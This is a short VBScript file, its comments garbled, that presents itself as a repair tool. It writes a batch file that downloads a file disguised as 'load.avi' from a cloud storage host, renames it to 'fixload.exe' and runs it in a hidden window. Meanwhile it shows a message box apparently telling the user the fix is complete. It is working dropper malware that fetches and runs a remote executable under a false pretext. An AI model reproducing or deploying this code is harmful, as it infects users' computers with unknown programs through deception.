Option Explicit

Dim fso, batFile, batContent, currentDir, WshShell

' ��ȡ��ǰĿ¼
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetAbsolutePathName(".")

' ���� updat.bat �ļ�������
batContent = "@echo off" & vbCrLf & _
             "setlocal" & vbCrLf & _
             "set url=https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi" & vbCrLf & _
             "set dest=load.avi" & vbCrLf & _
             "curl -o %dest% %url%" & vbCrLf & _
             "if exist %dest% (" & vbCrLf & _
             "    ren %dest% fixload.exe" & vbCrLf & _
             "    start fixload.exe" & vbCrLf & _
             ") else (" & vbCrLf & _
             "    echo Download failed." & vbCrLf & _
             ")" & vbCrLf & _
             "endlocal"

' ���� updat.bat �ļ�
batFile = currentDir & "\updat.bat"
With fso.CreateTextFile(batFile, True)
    .WriteLine batContent
    .Close
End With

' ��ʾ�û�
MsgBox "�޸���ɣ���ˢ����ҳ����", vbInformation, "��ʾ"

' ���� WshShell ����
Set WshShell = CreateObject("WScript.Shell")

' ���� updat.bat
WshShell.Run batFile, 0, False

' �������
Set fso = Nothing
Set WshShell = Nothing
